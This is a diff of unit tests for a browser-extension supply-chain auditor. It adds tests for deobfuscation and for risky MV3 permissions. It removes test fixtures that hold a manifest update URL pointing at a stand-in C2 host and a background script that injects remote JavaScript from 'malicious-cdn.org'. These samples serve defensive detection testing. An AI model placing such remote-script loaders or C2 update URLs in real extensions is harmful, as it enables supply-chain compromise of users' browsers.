@@ -1,10 +1,16 @@
-"""Unit tests for Extension Supply-Chain & Integrity Auditor."""
+"""Unit tests for Extension Supply-Chain & Integrity Auditor with MV3 and deobfuscation support."""
 
 import os
 import json
 import tempfile
 from pathlib import Path
-from src.core.auditor import SupplyChainAuditor
+from src.core.auditor import SupplyChainAuditor, Deobfuscator
+
+
+def test_deobfuscator_normalizes_dynamic_code():
+    obfuscated = r"document['create' + 'Element']('\x73\x63\x72\x69\x70\x74')"
+    normalized = Deobfuscator.normalize(obfuscated)
+    assert "script" in normalized
 
 
 def test_auditor_clean_baseline():
@@ -17,35 +23,23 @@ def test_auditor_clean_baseline():
 
         assert results["risk_score"] == 0
         assert results["overall_severity"] == "low"
+        assert results["ai_role_projection"]["hold_required"] is False
 
 
-def test_auditor_detects_unverified_update_url():
+def test_auditor_detects_mv3_offscreen_abuse():
     with tempfile.TemporaryDirectory() as tmpdir:
         manifest = Path(tmpdir) / "manifest.json"
         manifest.write_text(json.dumps({
-            "name": "Super Weather & Clock",
-            "version": "2.4.0",
-            "update_url": "https://unverified-third-party-c2.com/updates.xml"
+            "name": "Simple Weather Monitor",
+            "version": "2.0.0",
+            "permissions": ["offscreen", "scripting"],
+            "externally_connectable": {"matches": ["*://*/*"]}
         }))
 
         auditor = SupplyChainAuditor(target_path=tmpdir)
         results = auditor.audit()
 
         assert results["risk_score"] > 0
-        assert any("unverified update_url" in ind.lower() for ind in results["indicators"])
-
-
-def test_auditor_detects_dynamic_script_injection():
-    with tempfile.TemporaryDirectory() as tmpdir:
-        script = Path(tmpdir) / "background.js"
-        script.write_text("""
-        const s = document.createElement('script');
-        s.src = 'https://malicious-cdn.org/payload.js';
-        document.head.appendChild(s);
-        """)
-
-        auditor = SupplyChainAuditor(target_path=tmpdir)
-        results = auditor.audit()
-
-        assert results["risk_score"] > 0
-        assert any("dynamic remote script" in ind.lower() for ind in results["indicators"])
+        assert any("offscreen" in ind.lower() for ind in results["indicators"])
+        assert any("externally_connectable" in ind.lower() for ind in results["indicators"])
+        assert results["ai_role_projection"]["hold_required"] is True
